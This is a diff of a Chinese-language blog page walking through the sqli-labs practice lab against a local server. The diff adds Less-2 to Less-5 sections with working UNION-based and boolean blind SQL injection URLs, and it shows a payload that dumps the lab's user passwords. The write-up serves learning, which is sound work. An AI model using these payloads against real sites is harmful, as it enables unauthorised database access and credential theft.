@@ -31,8 +31,12 @@
 <meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-09-18_22-52-00.png">
 <meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-09-18_23-36-10.png">
 <meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-09-18_23-41-45.png">
+<meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-15-08.png">
+<meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-16-07.png">
+<meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-20-39.png">
+<meta property="og:image" content="http://example.com/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-26-45.png">
 <meta property="article:published_time" content="2023-09-18T13:19:06.000Z">
-<meta property="article:modified_time" content="2023-09-18T16:04:29.466Z">
+<meta property="article:modified_time" content="2023-10-15T09:03:09.272Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="sql">
@@ -192,7 +196,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-09-19 00:04:29" itemprop="dateModified" datetime="2023-09-19T00:04:29+08:00">2023-09-19</time>
+                <time title="Modified: 2023-10-15 17:03:09" itemprop="dateModified" datetime="2023-10-15T17:03:09+08:00">2023-10-15</time>
               </span>
 
           
@@ -253,7 +257,39 @@
 <p>可以看到爆出了username和password</p>
 <h2 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=0&#x27; union select 1,2,group_concat(password,&quot;:&quot;,username) from users -- +</span><br><span class="line">#用group_concat合并同一列的全部数据</span><br><span class="line">执行的sql语句:SELECT * FROM users WHERE id=&#x27;0&#x27; union select 1,2,group_concat(password,&quot;:&quot;,username) from users -- &#x27; LIMIT 0,1</span><br><span class="line">Your Password:Dumb:Dumb,I-kill-you:Angelina,p@ssword:Dummy,crappy:secure,stupidity:stupid,genious:superman,mob!le:batman,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dumbo:dhakkan,admin4:admin4 </span><br></pre></td></tr></table></figure>
 
+<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>判断为数字型注入</p>
+<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-15-08.png"></p>
+<h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=0 union select 1,database(),version() -- +</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-16-07.png"></p>
+<h2 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h2><p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-20-39.png"></p>
+<p>之后步骤也和less-1一样</p>
+<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>通过看后台源代码可以发现，</p>
+<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-26-45.png"></p>
+<p>与less-1的区别在于有括号，在比赛中往往不能看到源码，所以要对括号闭合进行测试</p>
+<p>其余与less-1一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=0&#x27;) union select 1,2,3 -- +</span><br></pre></td></tr></table></figure>
+
+<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>双引号且括号闭合，与less-1一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-4/?id=0&quot;) union select 1,2,3 -- +</span><br></pre></td></tr></table></figure>
+
+<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>本题是单引号字符型，但没有回显，所以联合注入就没用了，应当使用布尔盲注</p>
+<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><p>主要用到三个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">length函数，用来判断数据库长度</span><br><span class="line">ascii函数，用来判断字符的ascii值，也就是确认字符</span><br><span class="line">substr函数，用来截取字符串。有三个参数，从左到右分别是，要操作的字符串，起始位置，截取长度</span><br></pre></td></tr></table></figure>
+
+<p>具体用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and length((select database()))&gt;5 -- +</span><br><span class="line">判断数据库名长度是否大于5</span><br><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and ascii(substr((select database()),1,1))=115 -- +</span><br><span class="line">判断数据库第一个单词是不是小写字母&quot;s&quot;</span><br></pre></td></tr></table></figure>
+
+<p>按照联合注入，应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>
+
+<p>但是到了盲注这里就变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length((select group_concat(table_name) from information_schema.tables where table_schema=database())))&gt;13 -- +</span><br><span class="line">判断全部表名长度</span><br></pre></td></tr></table></figure>
+
+<p>然后依次判断表名字符</p>
+<p>到这里，工作量已经非常巨大了</p>
+<p>之后还要判断列名，还要判断值，所以不如使用自动化工具 <strong>sqlmap</strong></p>
+<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1>
     </div>
 
     
@@ -337,7 +373,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-1"><span class="nav-number">1.</span> <span class="nav-text">less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">判断注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.2.</span> <span class="nav-text">爆当前数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">注入常见参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="nav-number">1.4.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="nav-number">1.5.</span> <span class="nav-text">爆列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%80%BC"><span class="nav-number">1.6.</span> <span class="nav-text">爆值</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-1"><span class="nav-number">1.</span> <span class="nav-text">less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">判断注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.2.</span> <span class="nav-text">爆当前数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">注入常见参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="nav-number">1.4.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="nav-number">1.5.</span> <span class="nav-text">爆列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E5%80%BC"><span class="nav-number">1.6.</span> <span class="nav-text">爆值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-2"><span class="nav-number">2.</span> <span class="nav-text">less-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">2.1.</span> <span class="nav-text">爆数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D-1"><span class="nav-number">2.2.</span> <span class="nav-text">爆表名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-3"><span class="nav-number">3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-4"><span class="nav-number">4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-5"><span class="nav-number">5.</span> <span class="nav-text">less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">布尔注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-6"><span class="nav-number">6.</span> <span class="nav-text">less-6</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -351,14 +387,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
